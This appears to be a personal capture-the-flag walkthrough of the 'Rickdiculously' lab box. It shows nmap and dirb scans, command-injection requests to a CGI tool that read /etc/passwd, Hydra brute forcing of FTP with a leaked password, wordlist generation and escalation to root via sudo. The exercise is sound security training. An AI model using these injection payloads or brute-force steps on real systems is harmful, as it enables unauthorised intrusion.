# Scan

## nmap
    $ sudo nmap -sT -A -T4 -Pn -n  -p- 192.168.56.10
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 08:01 CEST
    Nmap scan report for 192.168.56.10
    Host is up (0.00025s latency).
    Not shown: 65528 closed ports
    PORT      STATE SERVICE    VERSION
    21/tcp    open  ftp        vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
    |_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:192.168.56.1
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 2
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp    open  tcpwrapped
    |_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
    80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Apache/2.4.27 (Fedora)
    |_http-title: Morty's Website
    9090/tcp  open  http       Cockpit web service 161 or earlier
    |_http-title: Did not follow redirect to https://192.168.56.10:9090/
    13337/tcp open  tcpwrapped
    22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
    |   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
    |_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
    60000/tcp open  tcpwrapped
    |_drda-info: ERROR
    MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.25 ms 192.168.56.10

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 38.61 seconds



└─$ nmap --script vuln 192.168.56.10 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 08:07 CEST
Nmap scan report for 192.168.56.10
Host is up (0.00014s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
|_sslv2-drown: 
22/tcp   open  ssh
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|   /icons/: Potentially interesting folder w/ directory listing
|_  /passwords/: Potentially interesting folder w/ directory listing
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
9090/tcp open  zeus-admin
|_sslv2-drown: 

Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds

## Get infon with ftp service

    └─$ ftp 192.168.56.10

    └─$ cat FLAG.txt   
    ftp> get FLAG.txt
    └─$ cat FLAG.txt                                          
    FLAG{Whoa this is unexpected} - 10 Points
     

    └─$ dirb http://192.168.56.10                 

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Sat Apr 10 08:21:41 2021
    URL_BASE: http://192.168.56.10/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612                                                          

    ---- Scanning URL: http://192.168.56.10/ ----
    + http://192.168.56.10/cgi-bin/ (CODE:403|SIZE:217)                                           
    + http://192.168.56.10/index.html (CODE:200|SIZE:326)                                         
    ==> DIRECTORY: http://192.168.56.10/passwords/                                                
    + http://192.168.56.10/robots.txt (CODE:200|SIZE:126)                                         
                                                                                              
    ---- Entering directory: http://192.168.56.10/passwords/ ----
    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
        (Use mode '-w' if you want to scan it anyway)
                                                                                   
    -----------------
    END_TIME: Sat Apr 10 08:21:41 2021
    DOWNLOADED: 4612 - FOUND: 3


    └─$ curl http://192.168.56.10/passwords/FLAG.txt                                           1 ⨯
    FLAG{Yeah d- just don't do it.} - 10 Points

    └─$ curl http://192.168.56.10/passwords/passwords.html
    <!DOCTYPE html>
    <html>
    <head>
    <title>Morty's Website</title>
    <body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
    <!--Password: winter-->
    </head>
    </html>


    └─$ curl http://192.168.56.10/robots.txt                                                 127 ⨯
    They're Robots Morty! It's ok to shoot them! They're just Robots!

    /cgi-bin/root_shell.cgi
    /cgi-bin/tracertool.cgi
    /cgi-bin/*



    curl -s  http://192.168.56.10//cgi-bin/tracertool.cgi?ip=127.0.0.1
    curl -s -G --data-urlencode "ip=127.0.0.1" http://192.168.56.10//cgi-bin/tracertool.cgi 
    curl -s -G --data-urlencode "ip=127.0.0.1;cat /etc/passwd" http://192.168.56.10//cgi-bin/tracertool.cgi
    curl -s -G --data-urlencode "ip=127.0.0.1;tac /etc/passwd" http://192.168.56.10//cgi-bin/tracertool.cgi
    curl -s -G --data-urlencode "ip=127.0.0.1;more /etc/passwd" http://192.168.56.10//cgi-bin/tracertool.cgi


==> Get a list of users
    
    root
    RickSanchez
    Morty
    Summer

## Brute force FTP service

    └─$ hydra -L users.txt -p winter -t4 ftp://192.168.56.10
    Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-10 08:54:41
    [DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
    [DATA] attacking ftp://192.168.56.10:21/
    [21][ftp] host: 192.168.56.10   login: Summer   password: winter
    1 of 1 target successfully completed, 1 valid password found


└─$ ssh Summer@192.168.56.10 -p 22222

[Summer@localhost ~]$ more FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points


└─$ strings Safe_Password.jpg                 
JFIF
Exif
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek

└─$ cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points 

[Summer@localhost ThisDoesntContainAnyFlags]$ more NotAFlag.txt 
hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.
But seriously this isn't a flag..


┌──(kali㉿kali)-[~/OSCP/boxes/Rickdiculously]
└─$ ./safe 131333                                                                      1 ⨯
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.� @

crunch 10 10 -t ,%Curtains -O >> dict.txt
crunch 7 7 -t ,%Flesh -O >> dict.txt



from string import ascii_uppercase
for c in ascii_uppercase:
    for x in range(0, 10):
        print str(c) + str(x) + "Flesh"
        print str(c) + str(x) + "Curtains"

[RickSanchez@localhost home]$ sudo su
[root@localhost home]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@localhost home]# more /root/FLAG.txt 
FLAG: {Ionic Defibrillator} - 30 points

└─$ nc 192.168.56.10 60000                                         
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt 
# more FLAG.txt 
more FLAG.txt: command not found 
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points 

┌──(kali㉿kali)-[~/OSCP/boxes/Rickdiculously]
└─$ sudo nmap -sV -sS -p 13337 192.168.56.10                                               1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 06:49 CEST
Nmap scan report for 192.168.56.10
Host is up (0.00015s latency).

PORT      STATE SERVICE VERSION
13337/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port13337-TCP:V=7.91%I=7%D=4/11%Time=60727FC0%P=x86_64-pc-linux-gnu%r(N
SF:ULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/Rickdiculously]
└─$ nc 192.168.56.10 13337             
FLAG:{TheyFoundMyBackDoorMorty}-10Points
 
grep '[a-zA-Z0-9]' /etc/passwd